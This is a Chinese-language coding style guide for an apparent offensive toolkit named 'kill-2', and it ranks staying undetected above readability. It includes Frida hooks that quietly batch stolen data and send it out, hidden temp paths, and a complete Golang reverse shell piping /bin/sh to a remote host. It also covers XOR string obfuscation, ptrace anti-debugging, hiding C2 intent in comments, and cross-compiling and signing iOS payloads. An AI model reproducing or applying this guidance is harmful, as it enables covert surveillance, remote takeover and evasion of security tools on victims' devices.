# kill-2 代码风格指南

## 核心原则

1. **隐形 > 优雅** — 代码第一要务是不被检测，不是可读性
2. **模块化且可 strip** — 生产版本去掉所有注释和调试符号
3. **强容错** — 每一行都可能被中断，每条路径都必须处理异常
4. **单次编译，多处运行** — 优先 Python/JS/Golang 跨平台

---

## Frida 脚本风格

### 隐蔽模式

```javascript
// ✅ 正确：动态符号解析 + 异常静默
const target = Module.findExportByName(null, 'targetFunc');
if (!target) return;  // 静默失败，不抛异常

// ❌ 错误：硬编码地址
Interceptor.attach(ptr('0x100123456'), ...)

// ❌ 错误：大规模日志输出
console.log('[+] hooked targetFunc at ' + target)
```

### 模式：按需激活

```javascript
// ✅ 正确：需要时才 hook，默认静默
let active = false;
const swtch = Module.findExportByName(null, 'UIApplication._handleSwitch');
if (swtch) {
  Interceptor.attach(swtch, {
    onEnter(args) { active = !active; }
  });
}

// 所有 hook 在 onEnter 外部判断 active 再执行
```

### 数据提取

```javascript
// ✅ 正确：批量收集 + 分批外传
const buffer = [];
function flush() {
  if (buffer.length >= 10) {
    send(JSON.stringify(buffer));
    buffer.length = 0;
  }
}

// ❌ 错误：每次调用都 send()
Interceptor.attach(target, {
  onEnter(args) { send(args[0].readCString()); }
});
```

---

## Python 脚本风格

```python
#!/usr/bin/env python3
# kill-2 Python Template

import sys, json, time, base64, struct
from typing import Optional, Dict, Any

class SilentError(Exception):
    """静默异常：不产生任何日志输出"""
    pass

class Operator:
    """操作模板 — 每个模块一个"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.results = []
    
    def run(self) -> bool:
        """主入口：返回 True=成功 False=静默跳过"""
        try:
            if not self._preflight():
                return False
            return self._execute()
        except SilentError:
            return False
        except Exception as e:
            # 仅 debug 模式输出，生产版本静默
            if self.config.get('debug'):
                sys.stderr.write(f'[!] {e}\n')
            return False
    
    def _preflight(self) -> bool:
        """前置检查"""
        return True
    
    def _execute(self) -> bool:
        """执行体"""
        raise NotImplementedError

# ✅ 正确：隐蔽路径构造
def stealth_path(base: str) -> str:
    """生成不易被扫描发现的临时路径"""
    import random, string
    # 使用系统常用目录模拟
    prefix = random.choice(['/tmp/.cache/', '/tmp/.ICE-unix/', '/dev/shm/.'])
    suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
    return prefix + '.' + suffix

# ❌ 错误：直接写入明显位置
# open('/tmp/exploit.py', 'w')
```

### Golang 负载风格

```go
// ✅ 正确：无依赖、静态编译、最小体积
package main
// 使用 -ldflags="-s -w" 编译
import (
    "net"
    "os"
    "os/exec"
    "syscall"
)

func main() {
    // 无输出、无日志、无 banner
    conn, err := net.Dial("tcp", os.Args[1])
    if err != nil { os.Exit(1) }
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
    cmd.Stdout = conn
    cmd.Stderr = conn
    cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
    cmd.Run()
}
```

---

## C/ObjC 风格

```c
// ✅ 正确：混淆字符串 + 动态调用
char key[32] = {0};
char enc[] = {0x73, 0x68, 0x65, 0x6c, 0x6c, 0x00};  // "shell"
for (int i = 0; i < 5; i++) key[i] = enc[i] ^ 0x11;  // 运行时解码

// ❌ 错误：明文关键字符串
// system("whoami");

// ✅ 正确：syscall 绕过 ptrace 检测
static int anti_debug() {
    // 使用 syscall 而不是 ptrace 函数
    struct syscall_args args = {SYS_ptrace, 31, 0, 0, 0};
    return syscall_wrapper(&args);
}
```

---

## 注释规范

```python
# ✅ 开发注释（strip 掉）：
# STAGE: recon — 此处收集设备指纹
# BUG: iOS 18.3 以上该地址偏移变化
# TODO: 添加 arch 切换逻辑

# ✅ 生产保留注释（不会暴露意图）：
# check platform compatibility
# verify return value
# retry with backoff

# ❌ 绝不写进生产代码：
# Hook the encryption function to dump AES key
# This is the C2 server address
# Connect to 192.168.1.1:4444
```

---

## 必备工具链配置

### Python 虚拟环境
```bash
python3 -m venv .venv --without-pip  # 最小环境
source .venv/bin/activate
python3 -c "import sys; sys.path.insert(0, 'lib')"  # 本地库优先
```

### 交叉编译 iOS 工具
```bash
# macOS 编译 ARM64 静态二进制
xcrun -sdk iphoneos clang -arch arm64 -o payload payload.c \
  -Os -Wl,-dead_strip -framework Foundation
# 签名
ldid -Sent.xml payload
```
